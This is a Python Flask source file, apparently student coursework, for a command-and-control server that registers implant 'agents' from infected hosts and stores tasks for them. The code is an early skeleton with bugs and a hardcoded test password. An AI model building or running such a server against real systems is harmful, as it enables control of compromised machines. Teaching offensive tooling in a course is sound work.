from flask import Flask , request, jsonify
from flask_sqlalchemy import SQLAlchemy
import hashlib;

app = Flask(__name__) # use this to generate routes and handlers

# some useful notes here #
"""
sqlite:///:memory: (in-memory database)
sqlite:///relative_path/test.db (relatie path file-based database)
sqlite:////absolute_path/test.db (abs path file-based database)
"""

# set the database to work with flask
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_db.sqlite'
db = SQLAlchemy(app)


password = "ch0nky" # a temperary password to test the server

# code snippets from lecture13

CREATED = "CREATED"
TASKED = 'TASKED'
DONE = "DONE"
class Task(db.Model):
    id= db.Column(db.Integer, primary_key=True)
    job_id = db.Column(db.String)
    command_type = db.Column(db.String)
    cmd = db.Column(db.String)
    Status = db.Column(db.String)
    agent_id = db.Column(db.String)

class Agent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String)
    username = db.Column(db.String)
    password = db.Column(db.String)

# search agent by agent_id
# link for ref: https://flask-sqlalchemy.palletsprojects.com/en/2.x/queries/
def find_agent_by_id(id_):
    return Agent.query.filter_by(agent_id=id_).first()


def verify_password(reg_agent_id, reg_password):
    """
        a function that verifies the password
        TODO: need a safer way to verify the password in the actual implementation
    """
    h = hashlib.sha256()
    h.update(reg_password)
    hex_password = h.hexdigest()
    agent = find_agent_by_id(reg_agent_id)
    return agent.password == hex_password

# the following is a route
# think of this as a subpage
# e.g. 127.0.0.1/register_agent
@app.route('/register_agent', methods=["POST"]) # support only POST requests
def register_agent(): # --> this is a handler
    """
        listens to the /register_agent route
        and processes the registration request from agents
    """
    # request.json -> this will be how we are getting data from implant
    reg_data = request.json # storing registration data
    reg_password = reg_data["password"]
    reg_whoami = reg_data["whoami"]
    reg_agent_id = reg_data["agent_id"]

    if verify_password(reg_agent_id, reg_password):
        print("[+] a new agent has successfully registered")
        print(f"[+] agent_id: {reg_agent_id}")
    else:
        # print("[-] authentication failed")
        return jsonify({"status": "authentication failed"})

    agent = Agent(agent_id = reg_agent_id, username = reg_whoami)
    db.session.add(agent)
    print(f"[+] A new agent {agent.id} has connected to our server! {agent.agent_id}, {agent.username}")
    db.session.commit()

    return jsonify({"status": "ok", "message": "Welcome!"})

if __name__ == '__main__':
    app.run()